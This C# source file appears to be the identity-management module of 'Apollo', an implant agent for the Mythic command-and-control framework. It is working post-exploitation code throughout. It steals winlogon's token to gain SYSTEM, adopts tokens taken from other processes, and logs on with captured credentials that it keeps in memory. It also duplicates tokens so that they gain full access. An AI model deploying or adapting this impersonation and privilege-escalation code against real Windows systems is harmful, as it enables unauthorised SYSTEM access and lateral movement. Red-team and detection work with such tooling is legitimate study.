using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static ApolloInterop.Constants.Win32;
using static ApolloInterop.Enums.Win32;
using static ApolloInterop.Structs.Win32;
using SECURITY_IMPERSONATION_LEVEL = ApolloInterop.Features.WindowsTypesAndAPIs.WinNTTypes.SECURITY_IMPERSONATION_LEVEL;

namespace Apollo.Management.Identity;

public class IdentityManager : IIdentityManager
{
    private readonly IAgent _agent;
    private readonly object _identitySync = new();

    private ApolloLogonInformation _userCredential;
    private WindowsIdentity _originalIdentity;
    private WindowsIdentity _currentPrimaryIdentity;
    private WindowsIdentity _currentImpersonationIdentity;
    private bool _isImpersonating;

    private IntPtr _executingThread = IntPtr.Zero;
    private IntPtr _originalImpersonationToken = IntPtr.Zero;
    private IntPtr _originalPrimaryToken = IntPtr.Zero;
    private WindowsIdentity? _loadedProfileIdentity;
    private IntPtr _loadedProfileHandle = IntPtr.Zero;

    #region Delegate Typedefs

    private const int PI_NOUI = 0x00000001;

    private delegate IntPtr GetCurrentThread();

    private delegate bool OpenThreadToken(
        IntPtr threadHandle,
        uint desiredAccess,
        bool openAsSelf,
        out IntPtr tokenHandle);

    private delegate bool OpenProcessToken(
        IntPtr hProcess,
        uint dwDesiredAccess,
        out IntPtr hToken);

    private delegate bool DuplicateTokenEx(
        IntPtr hToken,
        TokenAccessLevels dwDesiredAccess,
        IntPtr lpTokenAttributes,
        SECURITY_IMPERSONATION_LEVEL impersonationLevel,
        TokenType tokenType,
        out IntPtr phNewToken);

    private delegate bool SetThreadToken(
        ref IntPtr hThread,
        IntPtr hToken);

    private delegate bool CloseHandle(IntPtr hHandle);

    private delegate bool GetTokenInformation(
        IntPtr tokenHandle,
        TokenInformationClass tokenInformationClass,
        IntPtr tokenInformation,
        int tokenInformationLength,
        out int returnLength);

    private delegate IntPtr GetSidSubAuthorityCount(IntPtr pSid);
    private delegate IntPtr GetSidSubAuthority(IntPtr pSid, int nSubAuthority);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct ProfileInfo
    {
        public int dwSize;
        public int dwFlags;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string? lpUserName;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string? lpProfilePath;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string? lpDefaultPath;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string? lpServerName;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string? lpPolicyPath;
        public IntPtr hProfile;
    }

    [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Unicode)]
    private delegate bool LogonUserW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpszUsername,
        [MarshalAs(UnmanagedType.LPWStr)] string lpszDomain,
        [MarshalAs(UnmanagedType.LPWStr)] string lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken);

    [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Unicode)]
    private delegate bool LoadUserProfileW(
        IntPtr hToken,
        ref ProfileInfo lpProfileInfo);

    private delegate bool UnloadUserProfile(
        IntPtr hToken,
        IntPtr hProfile);

    private readonly GetCurrentThread _GetCurrentThread;
    private readonly OpenThreadToken _OpenThreadToken;
    private readonly OpenProcessToken _OpenProcessToken;
    private readonly DuplicateTokenEx _DuplicateTokenEx;
    private readonly SetThreadToken _SetThreadToken;
    private readonly CloseHandle _CloseHandle;
    private readonly GetTokenInformation _GetTokenInformation;
    private readonly GetSidSubAuthorityCount _GetSidSubAuthorityCount;
    private readonly GetSidSubAuthority _GetSidSubAuthority;

    private readonly LogonUserW _pLogonUserW;
    private readonly LoadUserProfileW _pLoadUserProfileW;
    private readonly UnloadUserProfile _pUnloadUserProfile;

    #endregion

    public IdentityManager(IAgent agent)
    {
        _agent = agent;

        _GetCurrentThread = _agent.GetApi().GetLibraryFunction<GetCurrentThread>(Library.KERNEL32, "GetCurrentThread");
        _OpenThreadToken = _agent.GetApi().GetLibraryFunction<OpenThreadToken>(Library.ADVAPI32, "OpenThreadToken");
        _OpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
        _DuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
        _SetThreadToken = _agent.GetApi().GetLibraryFunction<SetThreadToken>(Library.ADVAPI32, "SetThreadToken");
        _CloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
        _GetTokenInformation = _agent.GetApi().GetLibraryFunction<GetTokenInformation>(Library.ADVAPI32, "GetTokenInformation");
        _GetSidSubAuthorityCount = _agent.GetApi().GetLibraryFunction<GetSidSubAuthorityCount>(Library.ADVAPI32, "GetSidSubAuthorityCount");
        _GetSidSubAuthority = _agent.GetApi().GetLibraryFunction<GetSidSubAuthority>(Library.ADVAPI32, "GetSidSubAuthority");
        _pLogonUserW = _agent.GetApi().GetLibraryFunction<LogonUserW>(Library.ADVAPI32, "LogonUserW");
        _pLoadUserProfileW = _agent.GetApi().GetLibraryFunction<LoadUserProfileW>(Library.USERENV, "LoadUserProfileW");
        _pUnloadUserProfile = _agent.GetApi().GetLibraryFunction<UnloadUserProfile>(Library.USERENV, "UnloadUserProfile");

        _originalIdentity = WindowsIdentity.GetCurrent();
        _currentPrimaryIdentity = _originalIdentity;
        _currentImpersonationIdentity = _originalIdentity;
        _isImpersonating = false;
        _userCredential = new ApolloLogonInformation();

        _executingThread = _GetCurrentThread();
        SetImpersonationToken();
        SetPrimaryToken();
    }

    private void SetPrimaryToken()
    {
        bool bRet = _OpenThreadToken(
            _executingThread,
            TOKEN_ALL_ACCESS,
            true,
            out _originalPrimaryToken);

        int dwError = Marshal.GetLastWin32Error();

        if (!bRet)
        {
            if (dwError == Error.ERROR_NO_TOKEN)
            {
                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
                bRet = _OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out _originalPrimaryToken);
                if (!bRet)
                    throw new Exception($"Failed to open process token: {Marshal.GetLastWin32Error()}");
            }
            else
            {
                throw new Exception($"Failed to open thread token: {dwError}");
            }
        }

        if (_originalPrimaryToken == IntPtr.Zero)
            _originalPrimaryToken = _originalIdentity.Token;
    }

    private void SetImpersonationToken()
    {
        bool bRet = _OpenThreadToken(
            _executingThread,
            TOKEN_ALL_ACCESS,
            true,
            out IntPtr hToken);

        int dwError = Marshal.GetLastWin32Error();

        if (!bRet)
        {
            if (dwError == Error.ERROR_NO_TOKEN)
            {
                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
                bRet = _OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken);
                if (!bRet)
                    throw new Exception($"Failed to acquire process token: {Marshal.GetLastWin32Error()}");
            }
            else
            {
                throw new Exception($"Failed to open thread token: {dwError}");
            }
        }

        bRet = _DuplicateTokenEx(
            hToken,
            TokenAccessLevels.MaximumAllowed,
            IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
            TokenType.TokenImpersonation,
            out _originalImpersonationToken);

        _CloseHandle(hToken);

        if (!bRet)
            throw new Exception($"Failed to duplicate impersonation token: {Marshal.GetLastWin32Error()}");

        if (_originalImpersonationToken == IntPtr.Zero)
            _originalImpersonationToken = _originalIdentity.Token;
    }

    private static string GetProfileUserName(WindowsIdentity identity)
    {
        string identityName = identity.Name;
        int separatorIndex = identityName.LastIndexOf('\\');
        return separatorIndex >= 0 ? identityName.Substring(separatorIndex + 1) : identityName;
    }

    private void LoadProfileForIdentity(WindowsIdentity identity)
    {
        ProfileInfo profileInfo = new ProfileInfo
        {
            dwSize = Marshal.SizeOf(typeof(ProfileInfo)),
            dwFlags = PI_NOUI,
            lpUserName = GetProfileUserName(identity),
            hProfile = IntPtr.Zero
        };

        if (!_pLoadUserProfileW(identity.Token, ref profileInfo))
        {
            int dwError = Marshal.GetLastWin32Error();
            DebugHelp.DebugWriteLine($"[!] LoadUserProfileW() failed for {identity.Name}: {dwError}");
            return;
        }

        _loadedProfileIdentity = identity;
        _loadedProfileHandle = profileInfo.hProfile;
    }

    private void UnloadLoadedProfile()
    {
        if (_loadedProfileIdentity == null || _loadedProfileHandle == IntPtr.Zero)
            return;

        if (!_pUnloadUserProfile(_loadedProfileIdentity.Token, _loadedProfileHandle))
        {
            int dwError = Marshal.GetLastWin32Error();
            DebugHelp.DebugWriteLine($"[!] UnloadUserProfile() failed for {_loadedProfileIdentity.Name}: {dwError}");
        }

        _loadedProfileIdentity = null;
        _loadedProfileHandle = IntPtr.Zero;
    }

    private void RevertInternal()
    {
        if (!_SetThreadToken(ref _executingThread, _originalImpersonationToken))
        {
            DebugHelp.DebugWriteLine($"[!] Revert() failed to restore thread token: {Marshal.GetLastWin32Error()}");
        }

        UnloadLoadedProfile();

        _userCredential = new ApolloLogonInformation();
        _currentImpersonationIdentity = _originalIdentity;
        _currentPrimaryIdentity = _originalIdentity;
        _isImpersonating = false;
    }

    public bool IsOriginalIdentity()
    {
        lock (_identitySync)
        {
            return !_isImpersonating;
        }
    }

    public bool GetSystem()
    {
        lock (_identitySync)
        {
            if (GetIntegrityLevel() is not IntegrityLevel.HighIntegrity)
                return false;

            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
            if (processes.Length == 0)
                return false;

            // TOKEN_DUPLICATE | TOKEN_QUERY is all duplication needs; the copies get full access.
            if (!_OpenProcessToken(
                    processes[0].Handle,
                    (uint)(TokenAccessLevels.Query | TokenAccessLevels.Duplicate),
                    out IntPtr hToken))
            {
                DebugHelp.DebugWriteLine($"[!] GetSystem() - OpenProcessToken failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            try
            {
                if (!TrySetIdentityInternal(hToken))
                    return false;
            }
            finally
            {
                _CloseHandle(hToken);
            }

            // Not a full RevertInternal: RunAsSystem restores the caller's identity afterwards and
            // relies on its loaded profile staying loaded. Stale make_token credentials must still
            // go, or process creation could fall back to CreateProcessWithLogonW as that user.
            _userCredential = new ApolloLogonInformation();
            DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
            return true;
        }
    }

    public IntegrityLevel GetIntegrityLevel()
    {
        IntPtr hToken;

        lock (_identitySync)
        {
            hToken = _currentImpersonationIdentity.Token;
        }

        int dwRet = 0;
        int dwTokenInfoLength = 0;
        IntPtr pTokenLabel = IntPtr.Zero;

        _GetTokenInformation(
            hToken,
            TokenInformationClass.TokenIntegrityLevel,
            IntPtr.Zero,
            0,
            out dwTokenInfoLength);

        if (dwTokenInfoLength == 0 || Marshal.GetLastWin32Error() != Error.ERROR_INSUFFICIENT_BUFFER)
            return (IntegrityLevel)dwRet;

        pTokenLabel = Marshal.AllocHGlobal(dwTokenInfoLength);

        try
        {
            bool bRet = _GetTokenInformation(
                hToken,
                TokenInformationClass.TokenIntegrityLevel,
                pTokenLabel,
                dwTokenInfoLength,
                out dwTokenInfoLength);

            if (bRet)
            {
                TokenMandatoryLevel tokenLabel = (TokenMandatoryLevel)Marshal.PtrToStructure(pTokenLabel, typeof(TokenMandatoryLevel));
                IntPtr pSidSubAuthorityCount = _GetSidSubAuthorityCount(tokenLabel.Label.Sid);
                int subAuthorityCount = Marshal.ReadByte(pSidSubAuthorityCount);

                if (subAuthorityCount > 0)
                {
                    dwRet = Marshal.ReadInt32(_GetSidSubAuthority(tokenLabel.Label.Sid, subAuthorityCount - 1));
                }

                if (dwRet < SECURITY_MANDATORY_LOW_RID)
                    dwRet = 0;
                else if (dwRet < SECURITY_MANDATORY_MEDIUM_RID)
                    dwRet = 1;
                else if (dwRet < SECURITY_MANDATORY_HIGH_RID)
                    dwRet = 2;
                else if (dwRet < SECURITY_MANDATORY_SYSTEM_RID)
                    dwRet = 3;
                else
                    dwRet = 4;
            }
        }
        catch (Exception ex)
        {
            DebugHelp.DebugWriteLine($"[!] GetIntegrityLevel() failed: {ex.Message}");
        }
        finally
        {
            Marshal.FreeHGlobal(pTokenLabel);
        }

        return (IntegrityLevel)dwRet;
    }

    public WindowsIdentity GetCurrent()
    {
        lock (_identitySync)
        {
            return _currentImpersonationIdentity;
        }
    }

    public WindowsIdentity GetOriginal()
    {
        lock (_identitySync)
        {
            return _originalIdentity;
        }
    }

    public bool SetIdentity(ApolloLogonInformation logonInfo)
    {
        lock (_identitySync)
        {
            RevertInternal();

            bool bRet = _pLogonUserW(
                logonInfo.Username,
                logonInfo.Domain,
                logonInfo.Password,
                logonInfo.NetOnly ? LogonType.LOGON32_LOGON_NEW_CREDENTIALS : LogonType.LOGON32_LOGON_INTERACTIVE,
                LogonProvider.LOGON32_PROVIDER_WINNT50,
                out IntPtr hToken);

            if (!bRet)
            {
                return false;
            }

            try
            {
                if (!TrySetIdentityInternal(hToken))
                    return false;
            }
            finally
            {
                _CloseHandle(hToken);
            }

            _userCredential = logonInfo;
            LoadProfileForIdentity(_currentPrimaryIdentity);
            return true;
        }
    }

    // Takes on the identity of an existing token (e.g. one stolen from another process).
    // Like make_token, this first reverts, which also clears any stored credentials and loaded
    // profile, and ensures the copies are made (and given their default DACL) as ourselves.
    public bool SetIdentity(IntPtr hToken)
    {
        lock (_identitySync)
        {
            RevertInternal();
            return TrySetIdentityInternal(hToken);
        }
    }

    // Points both identities at copies of hToken: a primary token, which process creation
    // (CreateProcessAsUser/CreateProcessWithTokenW) requires, and an impersonation token for
    // the agent's threads. Leaves the current identities unchanged on failure.
    private bool TrySetIdentityInternal(IntPtr hToken)
    {
        WindowsIdentity? primary = DuplicateIdentity(hToken, TokenType.TokenPrimary);
        if (primary == null)
            return false;

        WindowsIdentity? impersonation = DuplicateIdentity(hToken, TokenType.TokenImpersonation);
        if (impersonation == null)
        {
            primary.Dispose();
            return false;
        }

        _currentPrimaryIdentity = primary;
        _currentImpersonationIdentity = impersonation;
        _isImpersonating = true;
        return true;
    }

    private WindowsIdentity? DuplicateIdentity(IntPtr hToken, TokenType tokenType)
    {
        // With null token attributes the copy gets a default security descriptor from the
        // caller's token, so MAXIMUM_ALLOWED grants full access however little access hToken
        // was opened with - including the TOKEN_ADJUST_DEFAULT/TOKEN_ADJUST_SESSIONID that
        // process creation needs. The level must be the native SECURITY_IMPERSONATION_LEVEL:
        // .NET's TokenImpersonationLevel has a leading None = 0 and is off by one.
        if (!_DuplicateTokenEx(
                hToken,
                TokenAccessLevels.MaximumAllowed,
                IntPtr.Zero,
                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                tokenType,
                out IntPtr hDupToken))
        {
            DebugHelp.DebugWriteLine($"[!] DuplicateTokenEx({tokenType}) failed: {Marshal.GetLastWin32Error()}");
            return null;
        }

        // WindowsIdentity keeps its own duplicate of the handle, so ours is always closed.
        try
        {
            return new WindowsIdentity(hDupToken);
        }
        finally
        {
            _CloseHandle(hDupToken);
        }
    }

    public bool RunAsSystem(Action<WindowsIdentity> action)
    {
        if (action == null)
            throw new ArgumentNullException(nameof(action));

        lock (_identitySync)
        {
            var savedPrimaryIdentity = _currentPrimaryIdentity;
            var savedImpersonationIdentity = _currentImpersonationIdentity;
            var wasImpersonating = _isImpersonating;
            var savedUserCredential = _userCredential;

            try
            {
                if (!GetSystem())
                    return false;

                action(_currentImpersonationIdentity);
                return true;
            }
            finally
            {
                _currentPrimaryIdentity = savedPrimaryIdentity;
                _currentImpersonationIdentity = savedImpersonationIdentity;
                _isImpersonating = wasImpersonating;
                _userCredential = savedUserCredential;
            }
        }
    }

    public void Revert()
    {
        lock (_identitySync)
        {
            RevertInternal();
        }
    }

    public WindowsIdentity GetCurrentPrimaryIdentity()
    {
        lock (_identitySync)
        {
            return _currentPrimaryIdentity;
        }
    }

    public WindowsIdentity GetCurrentImpersonationIdentity()
    {
        lock (_identitySync)
        {
            return _currentImpersonationIdentity;
        }
    }

    public bool GetCurrentLogonInformation(out ApolloLogonInformation logonInfo)
    {
        lock (_identitySync)
        {
            if (!string.IsNullOrEmpty(_userCredential.Username) &&
                !string.IsNullOrEmpty(_userCredential.Password))
            {
                logonInfo = _userCredential;
                return true;
            }

            logonInfo = new ApolloLogonInformation();
            return false;
        }
    }
}
